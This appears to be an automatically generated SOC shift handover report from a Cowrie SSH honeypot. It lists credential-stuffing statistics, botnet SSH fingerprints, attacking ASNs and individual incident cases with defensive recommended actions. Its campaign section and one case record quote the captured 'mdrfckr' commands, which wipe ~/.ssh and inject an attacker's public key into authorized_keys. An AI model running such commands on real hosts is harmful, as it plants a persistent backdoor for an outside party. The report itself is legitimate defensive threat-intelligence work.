# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-20 |
| **Generated At** | 2026-08-20T14:41:54Z |
| **Shift Time** | 14:41 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **136** |
| Confirmed Threats | **123** |
| False Positives Filtered | **13** (9.6%) |
| Unique Attacker IPs | **62** |
| Countries of Origin | **26** |
| High Severity Cases | **64** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **72** |
| Malware Samples Analyzed | **2** HIGH · **22** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **80** |
| Unique Credential Pairs | **42** |
| Unique Usernames | **11** |
| Unique Passwords | **42** |
| Successful Auth Pairs | **71** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 21 |
| `unknown` | 11 |
| `ubuntu` | 10 |
| `support` | 10 |
| `nobody` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `root12345678` | 6 |
| `root` | 6 |
| `test` | 5 |
| `support2000` | 5 |
| `admin2006` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `root12345678` | 6 |
| `unknown` | `root` | 6 |
| `guest` | `test` | 5 |
| `support` | `support2000` | 5 |
| `admin` | `admin2006` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `unknown` | `qwerty1234` | `220.246.43.172` | 2026-08-20T10:58:23 |
| `unknown` | `qwerty1234` | `1.247.245.61` | 2026-08-20T10:58:33 |
| `unknown` | `qwerty1234` | `103.121.27.218` | 2026-08-20T10:58:34 |
| `root` | `root12345678` | `10.0.0.73` | 2026-08-20T10:58:52 |
| `root` | `root12345678` | `111.70.32.49` | 2026-08-20T11:00:28 |
| `root` | `root12345678` | `186.215.107.189` | 2026-08-20T11:00:37 |
| `root` | `1234` | `217.60.255.130` | 2026-08-20T11:00:52 |
| `nobody` | `nobody123` | `10.0.0.73` | 2026-08-20T11:05:31 |
| `ubuntu` | `Boy@123` | `217.60.255.130` | 2026-08-20T11:06:07 |
| `unknown` | `root` | `10.0.0.73` | 2026-08-20T11:13:27 |
| `root` | `root12345678` | `65.20.158.10` | 2026-08-20T11:16:38 |
| `root` | `root12345678` | `31.173.0.46` | 2026-08-20T11:16:46 |
| `ubuntu` | `vV123456` | `217.60.255.130` | 2026-08-20T11:17:12 |
| `support` | `support` | `176.53.159.196` | 2026-08-20T11:17:14 |
| `nobody` | `nobody123` | `103.174.145.35` | 2026-08-20T11:22:30 |
| `root` | `1314` | `217.60.255.130` | 2026-08-20T11:23:05 |
| `root` | `vinicius` | `83.235.16.111` | 2026-08-20T11:23:21 |
| `345gs5662d34` | `345gs5662d34` | `83.235.16.111` | 2026-08-20T11:23:24 |
| `root` | `3245gs5662d34` | `83.235.16.111` | 2026-08-20T11:23:25 |
| `test` | `test2023` | `117.216.33.31` | 2026-08-20T11:27:31 |
| `ubuntu` | `Cc@1234` | `217.60.255.130` | 2026-08-20T11:28:21 |
| `unknown` | `root` | `182.75.197.174` | 2026-08-20T11:31:33 |
| `unknown` | `root` | `182.53.52.68` | 2026-08-20T11:31:43 |
| `unknown` | `root` | `103.31.39.188` | 2026-08-20T11:31:45 |
| `unknown` | `root` | `85.105.2.51` | 2026-08-20T11:31:52 |
| `guest` | `test` | `10.0.0.73` | 2026-08-20T11:32:34 |
| `root` | `root1` | `182.118.64.225` | 2026-08-20T11:33:40 |
| `345gs5662d34` | `345gs5662d34` | `182.118.64.225` | 2026-08-20T11:33:44 |
| `root` | `3245gs5662d34` | `182.118.64.225` | 2026-08-20T11:33:45 |
| `root` | `1359` | `217.60.255.130` | 2026-08-20T11:34:00 |
| `guest` | `test` | `120.234.232.184` | 2026-08-20T11:34:09 |
| `guest` | `test` | `178.178.194.128` | 2026-08-20T11:34:19 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236` | `45.79.207.71` | 2026-08-20T11:35:27 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2223` | `172.234.217.129` | 2026-08-20T11:36:32 |
| `ubuntu` | `Aa@123` | `217.60.255.130` | 2026-08-20T11:39:39 |
| `support` | `support` | `10.0.0.73` | 2026-08-20T11:42:01 |
| `root` | `1368` | `217.60.255.130` | 2026-08-20T11:44:52 |
| `support` | `support2000` | `10.0.0.73` | 2026-08-20T11:46:54 |
| `guest` | `test` | `61.2.44.54` | 2026-08-20T11:50:07 |
| `guest` | `test` | `95.79.108.51` | 2026-08-20T11:50:15 |
| `ubuntu` | `Aa@1234` | `217.60.255.130` | 2026-08-20T11:50:48 |
| `test` | `test2023` | `121.178.185.141` | 2026-08-20T11:55:50 |
| `root` | `1502` | `217.60.255.130` | 2026-08-20T11:55:51 |
| `test` | `test2023` | `117.250.250.2` | 2026-08-20T11:55:59 |
| `ubuntu` | `Ahmad@123` | `217.60.255.130` | 2026-08-20T12:01:50 |
| `support` | `support2000` | `172.90.128.97` | 2026-08-20T12:05:02 |
| `support` | `support2000` | `191.241.142.170` | 2026-08-20T12:05:18 |
| `root` | `1988` | `217.60.255.130` | 2026-08-20T12:06:42 |
| `root` | `---fuck_you----` | `34.155.85.143` | 2026-08-20T12:06:49 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `162.216.150.230` | 2026-08-20T12:09:46 |
| `ubuntu` | `Ahmad@1234` | `217.60.255.130` | 2026-08-20T12:12:54 |
| `root` | `1999` | `217.60.255.130` | 2026-08-20T12:17:36 |
| `admin` | `admin2006` | `10.0.0.73` | 2026-08-20T12:20:19 |
| `ubuntu` | `Admin@2023` | `217.60.255.130` | 2026-08-20T12:23:56 |
| `unknown` | `1qaz2wsx` | `101.13.4.124` | 2026-08-20T12:23:59 |
| `unknown` | `1qaz2wsx` | `187.126.105.42` | 2026-08-20T12:24:14 |
| `root` | `2003` | `217.60.255.130` | 2026-08-20T12:28:31 |
| `nobody` | `nobody2007` | `61.169.54.150` | 2026-08-20T12:29:25 |
| `ubuntu` | `Hh2024` | `217.60.255.130` | 2026-08-20T12:35:00 |
| `admin` | `admin2006` | `14.153.226.83` | 2026-08-20T12:38:40 |
| `admin` | `admin2006` | `172.90.128.97` | 2026-08-20T12:38:48 |
| `admin` | `admin2006` | `96.56.228.149` | 2026-08-20T12:38:51 |
| `admin` | `admin2006` | `177.135.206.10` | 2026-08-20T12:38:59 |
| `root` | `2004` | `217.60.255.130` | 2026-08-20T12:39:28 |
| `centos` | `centos2009` | `10.0.0.73` | 2026-08-20T12:40:00 |
| `centos` | `centos2009` | `27.107.102.154` | 2026-08-20T12:41:36 |
| `centos` | `centos2009` | `182.75.197.174` | 2026-08-20T12:41:45 |
| `support` | `support2015` | `10.0.0.73` | 2026-08-20T12:45:50 |
| `ubuntu` | `Qq2025` | `217.60.255.130` | 2026-08-20T12:46:05 |
| `root` | `2005` | `217.60.255.130` | 2026-08-20T12:50:15 |
| `test` | `test2015` | `10.0.0.73` | 2026-08-20T12:53:55 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **136** |
| Sessions with Fingerprint | **8** |
| Unique HASSH Fingerprints | **8** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 36 |
| OpenSSH | 35 |
| Go SSH scanner | 3 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 34 | 30 |
| `419da4c91ddb...` | Modern SSH client | 21 | 1 |
| `f555226df196...` | Mirai/variant | 6 | 2 |
| `eff4c24daffc...` | Modern SSH client | 2 | 1 |
| `80ed13ac8199...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 34 | 30 | Mirai/variant |
| `419da4c91ddb...` | libssh | 21 | 1 | Modern SSH client |
| `95420f9d932d...` | libssh | 9 | 3 | — |
| `f555226df196...` | libssh | 6 | 2 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `80ed13ac8199...` | Unknown | 1 | 1 | Mirai/variant |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `0a39392927ed...` | OpenSSH | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `83.235.16.111`, `182.118.64.225`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **62** |
| Unique ASNs | **50** |
| High-Risk ASNs | **44** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |
| `AS9829` | National Internet Backbone | 3 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS3269` | Telecom Italia S.p.A. | 2 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 2 | HIGH |
| `AS396982` | Google LLC | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (63)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-d08a63f9dc4f

| Field | Detail |
|---|---|
| **Source IP** | `220.246.43[.]172` |
| **First Seen** | 2026-08-20 10:58 |
| **Last Seen** | 2026-08-20 10:58 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 10:58:19` | `cowrie.session.connect` |
| `2026-08-20 10:58:20` | `cowrie.client.version` |
| `2026-08-20 10:58:20` | `cowrie.client.kex` |
| `2026-08-20 10:58:23` | `cowrie.login.success` |
| `2026-08-20 10:58:24` | `cowrie.direct-tcpip.request` |
| `2026-08-20 10:58:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.246.43[.]172` to AbuseIPDB if not already reported
- [ ] Block `220.246.43[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eaa31ed90a40

| Field | Detail |
|---|---|
| **Source IP** | `1.247.245[.]61` |
| **First Seen** | 2026-08-20 10:58 |
| **Last Seen** | 2026-08-20 10:58 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 10:58:29` | `cowrie.session.connect` |
| `2026-08-20 10:58:30` | `cowrie.client.version` |
| `2026-08-20 10:58:30` | `cowrie.client.kex` |
| `2026-08-20 10:58:33` | `cowrie.login.success` |
| `2026-08-20 10:58:34` | `cowrie.direct-tcpip.request` |
| `2026-08-20 10:58:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.247.245[.]61` to AbuseIPDB if not already reported
- [ ] Block `1.247.245[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb8f6b6f68c1

| Field | Detail |
|---|---|
| **Source IP** | `103.121.27[.]218` |
| **First Seen** | 2026-08-20 10:58 |
| **Last Seen** | 2026-08-20 10:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 10:58:32` | `cowrie.session.connect` |
| `2026-08-20 10:58:32` | `cowrie.client.version` |
| `2026-08-20 10:58:32` | `cowrie.client.kex` |
| `2026-08-20 10:58:34` | `cowrie.login.success` |
| `2026-08-20 10:58:34` | `cowrie.direct-tcpip.request` |
| `2026-08-20 10:58:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.121.27[.]218` to AbuseIPDB if not already reported
- [ ] Block `103.121.27[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe46b330ce17

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]49` |
| **First Seen** | 2026-08-20 11:00 |
| **Last Seen** | 2026-08-20 11:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 11:00:25` | `cowrie.session.connect` |
| `2026-08-20 11:00:26` | `cowrie.client.version` |
| `2026-08-20 11:00:26` | `cowrie.client.kex` |
| `2026-08-20 11:00:28` | `cowrie.login.success` |
| `2026-08-20 11:00:29` | `cowrie.direct-tcpip.request` |
| `2026-08-20 11:00:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]49` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]49` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e393fc5f3a8

| Field | Detail |
|---|---|
| **Source IP** | `186.215.107[.]189` |
| **First Seen** | 2026-08-20 11:00 |
| **Last Seen** | 2026-08-20 11:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 11:00:34` | `cowrie.session.connect` |
| `2026-08-20 11:00:35` | `cowrie.client.version` |
| `2026-08-20 11:00:35` | `cowrie.client.kex` |
| `2026-08-20 11:00:37` | `cowrie.login.success` |
| `2026-08-20 11:00:38` | `cowrie.direct-tcpip.request` |
| `2026-08-20 11:00:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.215.107[.]189` to AbuseIPDB if not already reported
- [ ] Block `186.215.107[.]189` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31d5404402a1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 11:00 |
| **Last Seen** | 2026-08-20 11:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 11:00:49` | `cowrie.session.connect` |
| `2026-08-20 11:00:50` | `cowrie.client.version` |
| `2026-08-20 11:00:50` | `cowrie.client.kex` |
| `2026-08-20 11:00:52` | `cowrie.login.success` |
| `2026-08-20 11:00:52` | `cowrie.direct-tcpip.request` |
| `2026-08-20 11:00:52` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 11:00:52` | `cowrie.direct-tcpip.data` |
| `2026-08-20 11:00:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c754baec0db4

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 11:06 |
| **Last Seen** | 2026-08-20 11:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 11:06:03` | `cowrie.session.connect` |
| `2026-08-20 11:06:03` | `cowrie.client.version` |
| `2026-08-20 11:06:03` | `cowrie.client.kex` |
| `2026-08-20 11:06:07` | `cowrie.login.success` |
| `2026-08-20 11:06:07` | `cowrie.direct-tcpip.request` |
| `2026-08-20 11:06:07` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 11:06:07` | `cowrie.direct-tcpip.data` |
| `2026-08-20 11:06:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c92d71e631d

| Field | Detail |
|---|---|
| **Source IP** | `65.20.158[.]10` |
| **First Seen** | 2026-08-20 11:16 |
| **Last Seen** | 2026-08-20 11:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 11:16:36` | `cowrie.session.connect` |
| `2026-08-20 11:16:37` | `cowrie.client.version` |
| `2026-08-20 11:16:37` | `cowrie.client.kex` |
| `2026-08-20 11:16:38` | `cowrie.login.success` |
| `2026-08-20 11:16:39` | `cowrie.direct-tcpip.request` |
| `2026-08-20 11:16:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.158[.]10` to AbuseIPDB if not already reported
- [ ] Block `65.20.158[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c22662707b25

| Field | Detail |
|---|---|
| **Source IP** | `31.173.0[.]46` |
| **First Seen** | 2026-08-20 11:16 |
| **Last Seen** | 2026-08-20 11:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 11:16:44` | `cowrie.session.connect` |
| `2026-08-20 11:16:44` | `cowrie.client.version` |
| `2026-08-20 11:16:44` | `cowrie.client.kex` |
| `2026-08-20 11:16:46` | `cowrie.login.success` |
| `2026-08-20 11:16:47` | `cowrie.direct-tcpip.request` |
| `2026-08-20 11:16:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.173.0[.]46` to AbuseIPDB if not already reported
- [ ] Block `31.173.0[.]46` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a28eacab97e4

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 11:17 |
| **Last Seen** | 2026-08-20 11:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 11:17:11` | `cowrie.session.connect` |
| `2026-08-20 11:17:11` | `cowrie.client.version` |
| `2026-08-20 11:17:11` | `cowrie.client.kex` |
| `2026-08-20 11:17:12` | `cowrie.login.success` |
| `2026-08-20 11:17:12` | `cowrie.direct-tcpip.request` |
| `2026-08-20 11:17:13` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 11:17:13` | `cowrie.direct-tcpip.data` |
| `2026-08-20 11:17:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae637315f245

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-20 11:17 |
| **Last Seen** | 2026-08-20 11:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 11:17:14` | `cowrie.session.connect` |
| `2026-08-20 11:17:14` | `cowrie.client.version` |
| `2026-08-20 11:17:14` | `cowrie.client.kex` |
| `2026-08-20 11:17:14` | `cowrie.login.success` |
| `2026-08-20 11:17:14` | `cowrie.direct-tcpip.request` |
| `2026-08-20 11:17:14` | `cowrie.direct-tcpip.data` |
| `2026-08-20 11:17:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71ac82305c4d

| Field | Detail |
|---|---|
| **Source IP** | `103.174.145[.]35` |
| **First Seen** | 2026-08-20 11:22 |
| **Last Seen** | 2026-08-20 11:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 11:22:28` | `cowrie.session.connect` |
| `2026-08-20 11:22:28` | `cowrie.client.version` |
| `2026-08-20 11:22:28` | `cowrie.client.kex` |
| `2026-08-20 11:22:30` | `cowrie.login.success` |
| `2026-08-20 11:22:30` | `cowrie.direct-tcpip.request` |
| `2026-08-20 11:22:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.174.145[.]35` to AbuseIPDB if not already reported
- [ ] Block `103.174.145[.]35` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc0846549a2b

| Field | Detail |
|---|---|
| **Source IP** | `103.174.145[.]35` |
| **First Seen** | 2026-08-20 11:22 |
| **Last Seen** | 2026-08-20 11:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 11:22:36` | `cowrie.session.connect` |
| `2026-08-20 11:22:36` | `cowrie.client.version` |
| `2026-08-20 11:22:36` | `cowrie.client.kex` |
| `2026-08-20 11:22:37` | `cowrie.login.success` |
| `2026-08-20 11:22:38` | `cowrie.direct-tcpip.request` |
| `2026-08-20 11:22:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.174.145[.]35` to AbuseIPDB if not already reported
- [ ] Block `103.174.145[.]35` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b4b9edebbb3

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 11:22 |
| **Last Seen** | 2026-08-20 11:23 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 11:22:49` | `cowrie.session.connect` |
| `2026-08-20 11:22:50` | `cowrie.client.version` |
| `2026-08-20 11:22:50` | `cowrie.client.kex` |
| `2026-08-20 11:23:05` | `cowrie.login.success` |
| `2026-08-20 11:23:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff9795675ada

| Field | Detail |
|---|---|
| **Source IP** | `83.235.16[.]111` |
| **First Seen** | 2026-08-20 11:23 |
| **Last Seen** | 2026-08-20 11:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 11:23:20` | `cowrie.session.connect` |
| `2026-08-20 11:23:20` | `cowrie.client.version` |
| `2026-08-20 11:23:20` | `cowrie.client.kex` |
| `2026-08-20 11:23:21` | `cowrie.login.success` |
| `2026-08-20 11:23:22` | `cowrie.session.params` |
| `2026-08-20 11:23:22` | `cowrie.command.input` |
| `2026-08-20 11:23:22` | `cowrie.command.failed` |
| `2026-08-20 11:23:22` | `cowrie.log.closed` |
| `2026-08-20 11:23:23` | `cowrie.session.params` |
| `2026-08-20 11:23:23` | `cowrie.command.input` |
| `2026-08-20 11:23:23` | `cowrie.session.file_download` |
| `2026-08-20 11:23:23` | `cowrie.log.closed` |
